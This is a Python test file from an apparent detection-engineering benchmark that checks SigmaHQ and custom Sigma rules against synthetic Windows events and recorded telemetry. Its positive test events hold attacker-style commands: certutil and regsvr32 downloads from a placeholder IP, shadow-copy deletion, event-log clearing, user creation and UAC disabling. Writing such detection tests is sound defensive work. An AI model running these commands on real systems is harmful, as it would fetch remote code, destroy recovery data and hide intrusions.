"""Bundled rule sets: real SigmaHQ rules against hand-made events, rule-set integrity (DRL 1.1),
and the whole set over the recorded telemetry."""
import hashlib
import json
import time
from pathlib import Path

import pytest
from sigma_helpers import event, proc

from purplebench import catalog, sigma
from purplebench.sigma import mapping as M
from purplebench.telemetry import read_jsonl_gz

RULES = Path(__file__).resolve().parent.parent / "rules"
SIGMAHQ, CUSTOM = RULES / "sigmahq", RULES / "custom"
SYS32 = "C:\\Windows\\System32\\"


def hq(name):
    r = sigma.load_rule(SIGMAHQ / f"{name}.yml")
    assert r.status == "ok", r.reason
    return r


# (rule, positive event, negative event). Negatives are near misses: same tool, benign use.
CASES = [
    ("proc_creation_win_schtasks_creation",
     proc(Image=SYS32 + "schtasks.exe", CommandLine='schtasks /create /tn "Updater" /tr "cmd.exe /c calc.exe" /sc onlogon'),
     proc(Image=SYS32 + "schtasks.exe", CommandLine='schtasks /create /tn "Updater" /tr x /sc daily',
          User="NT AUTHORITY\\SYSTEM")),
    ("proc_creation_win_net_user_add",
     proc(Image=SYS32 + "net1.exe", OriginalFileName="net1.exe", CommandLine='net1 user /add "svc_backup" "P4ss!"'),
     proc(Image=SYS32 + "net.exe", OriginalFileName="net.exe", CommandLine="net user svc_backup")),
    ("proc_creation_win_susp_shadow_copies_deletion",
     proc(Image=SYS32 + "vssadmin.exe", OriginalFileName="VSSADMIN.EXE", CommandLine="vssadmin.exe delete shadows /all /quiet"),
     proc(Image=SYS32 + "vssadmin.exe", OriginalFileName="VSSADMIN.EXE", CommandLine="vssadmin.exe list shadows")),
    ("proc_creation_win_certutil_download",
     proc(Image=SYS32 + "certutil.exe", OriginalFileName="CertUtil.exe",
          CommandLine="certutil -urlcache -split -f http://203.0.113.5/a.txt a.txt"),
     proc(Image=SYS32 + "certutil.exe", OriginalFileName="CertUtil.exe", CommandLine="certutil -hashfile a.txt SHA256")),
    ("proc_creation_win_systeminfo_execution",
     proc(Image=SYS32 + "systeminfo.exe", OriginalFileName="sysinfo.exe", CommandLine="systeminfo"),
     proc(Image=SYS32 + "msinfo32.exe", OriginalFileName="msinfo32.exe", CommandLine="msinfo32")),
    ("proc_creation_win_sc_create_service",
     proc(Image=SYS32 + "sc.exe", CommandLine="sc.exe create TestSvc binPath= C:\\Temp\\svc.exe"),
     proc(Image=SYS32 + "sc.exe", CommandLine="sc.exe create TestSvc binPath= C:\\x.exe",
          ParentImage="C:\\Program Files\\Dropbox\\Client\\Dropbox.exe")),
    ("proc_creation_win_wmic_process_creation",
     proc(Image=SYS32 + "wbem\\WMIC.exe", OriginalFileName="wmic.exe", CommandLine="wmic process call create notepad.exe"),
     proc(Image=SYS32 + "wbem\\WMIC.exe", OriginalFileName="wmic.exe", CommandLine="wmic process list brief")),
    ("proc_creation_win_reg_add_run_key",
     proc(Image=SYS32 + "reg.exe", CommandLine='REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /V x /D y'),
     proc(Image=SYS32 + "reg.exe", CommandLine='REG QUERY "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"')),
    ("proc_creation_win_susp_eventlog_clear",
     proc(Image=SYS32 + "wevtutil.exe", OriginalFileName="wevtutil.exe", CommandLine="wevtutil cl System"),
     proc(Image=SYS32 + "wevtutil.exe", OriginalFileName="wevtutil.exe", CommandLine="wevtutil sl Microsoft-RMS-MSIPC/Debug /q:true",
          ParentImage=SYS32 + "msiexec.exe")),
    ("proc_creation_win_net_view_share_and_sessions_enum",
     proc(Image=SYS32 + "net.exe", OriginalFileName="net.exe", CommandLine="net view /domain"),
     proc(Image=SYS32 + "net.exe", OriginalFileName="net.exe", CommandLine="net view \\\\fileserver01")),
    ("proc_creation_win_regsvr32_network_pattern",
     proc(Image=SYS32 + "regsvr32.exe", OriginalFileName="REGSVR32.EXE",
          CommandLine="regsvr32.exe /s /u /i:http://203.0.113.5/x.sct scrobj.dll"),
     proc(Image=SYS32 + "regsvr32.exe", OriginalFileName="REGSVR32.EXE", CommandLine="regsvr32.exe /s C:\\app\\x.dll")),
    ("registry_set_uac_disable",
     event(13, TargetObject="HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA",
           Details="DWORD (0x00000000)", EventType="SetValue", Image=SYS32 + "reg.exe"),
     event(13, TargetObject="HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA",
           Details="DWORD (0x00000001)", EventType="SetValue", Image=SYS32 + "reg.exe")),
    ("file_event_win_startup_folder_file_write",
     event(11, Image="C:\\Users\\bob\\x.exe",
           TargetFilename="C:\\Users\\bob\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\a.bat"),
     event(11, Image="C:\\Program Files\\Microsoft Office\\root\\Office16\\ONENOTE.EXE",
           TargetFilename="C:\\Users\\bob\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Send to OneNote.lnk")),
]


@pytest.mark.parametrize("name,positive,negative", CASES, ids=[c[0] for c in CASES])
def test_real_sigmahq_rule_positive_and_negative(name, positive, negative):
    r = hq(name)
    profile = sigma.TelemetryProfile.from_events([positive, negative])
    pos = sigma.evaluate(r, [positive], profile)
    neg = sigma.evaluate(r, [negative], profile)
    assert pos.status == sigma.MATCH, pos.detail
    assert neg.status == sigma.NO_MATCH, neg.detail
    assert r.author  # DRL 1.1: the author travels with every result


def test_at_least_ten_real_rules_are_exercised():
    assert len({c[0] for c in CASES}) >= 10


# -------------------------------------------------------------------------------------------- integrity

def test_sigmahq_rules_are_unmodified_and_listed():
    sources = json.loads((SIGMAHQ / "SOURCES.json").read_text("utf-8"))
    listed = {r["file"]: r for r in sources["rules"]}
    files = {p.name for p in SIGMAHQ.glob("*.yml")}
    assert files == set(listed)
    assert 40 <= len(files) <= 60
    assert sources["commit"] == "552f3fee420ef232a8e5790c4fae591847e32347"
    for name, meta in listed.items():
        assert hashlib.sha256((SIGMAHQ / name).read_bytes()).hexdigest() == meta["sha256"], name
        assert meta["url"].endswith(meta["upstream_path"]) and sources["commit"] in meta["url"]
    assert (SIGMAHQ / "LICENSE.Detection.Rules.md").read_text("utf-8").startswith("# Detection Rule License (DRL) 1.1")


def test_rule_ids_unique_and_attribution_present():
    rules = sigma.load_rules(SIGMAHQ) + sigma.load_rules(CUSTOM)
    ids = [r.id for r in rules]
    assert len(ids) == len(set(ids))
    for r in rules:
        assert r.author and r.title and r.level, r.path
    custom = sigma.load_rules(CUSTOM)
    assert 10 <= len(custom) <= 15
    for r in custom:
        assert r.status == "ok", (r.path, r.reason)
        assert r.author == "Andrew T. Price II" and r.license == "DRL-1.1"
        assert r.techniques, r.path


# -------------------------------------------------------------------------------------------- recorded telemetry

@pytest.fixture(scope="module")
def recorded():
    manifest = catalog.load_manifest()
    windows = {}
    for f in manifest["files"]:
        windows[f["technique"] or "baseline"] = sigma.EventIndex(read_jsonl_gz(Path(catalog.library.DATA_DIR, "telemetry", f["path"])))
    return windows


def fired(rule, windows, profile):
    return {k for k, idx in windows.items() if sigma.evaluate(rule, idx, profile).status == sigma.MATCH}


@pytest.mark.parametrize("name,technique", [
    ("proc_creation_win_schtasks_creation", "T1053.005"),
    ("proc_creation_win_susp_eventlog_clear", "T1685.005"),
    ("proc_creation_win_certutil_download", "T1105"),
    ("proc_creation_win_susp_shadow_copies_deletion", "T1490"),
    ("proc_creation_win_net_user_add", "T1136.001"),
    ("proc_creation_win_sysinternals_procdump_lsass", "T1003.001"),
    ("proc_creation_win_reg_dumping_sensitive_hives", "T1003.002"),
    ("proc_creation_win_regsvr32_network_pattern", "T1218.010"),
    ("proc_creation_win_wmic_process_creation", "T1047"),
    ("registry_set_uac_disable", "T1548.002"),
])
def test_well_known_rules_fire_in_their_technique_window(recorded, name, technique):
    hits = fired(hq(name), recorded, sigma.recorded_profile())
    assert technique in hits
    assert "baseline" not in hits


def test_custom_rules_fire_on_their_technique_and_not_on_the_baseline(recorded):
    prof = sigma.recorded_profile()
    for r in sigma.load_rules(CUSTOM):
        hits = fired(r, recorded, prof)
        assert set(r.techniques) & hits, (r.path, hits)
        assert "baseline" not in hits, r.path


def test_security_and_powershell_rules_are_telemetry_gaps_in_recorded_mode(recorded):
    prof = sigma.recorded_profile()
    for r in sigma.load_rules(SIGMAHQ):
        if r.status != "ok":
            continue
        channels = {s.channel for s in r.sources}
        if M.SYSMON not in channels:
            res = sigma.evaluate(r, recorded["T1053.005"], prof)
            assert res.status == sigma.GAP and "is not in the telemetry" in res.detail, r.path


def test_full_rule_set_over_all_recorded_events_is_fast():
    events = [ev for f in catalog.load_manifest()["files"]
              for ev in read_jsonl_gz(Path(catalog.library.DATA_DIR, "telemetry", f["path"]))]
    rules = sigma.load_rules(SIGMAHQ) + sigma.load_rules(CUSTOM)
    t = time.perf_counter()
    results = sigma.evaluate_all(rules, events, sigma.recorded_profile())
    elapsed = time.perf_counter() - t
    assert len(events) > 80_000 and len(results) == len(rules)
    assert elapsed < 30, elapsed  # about 1 s on the development machine; the budget is 10 s
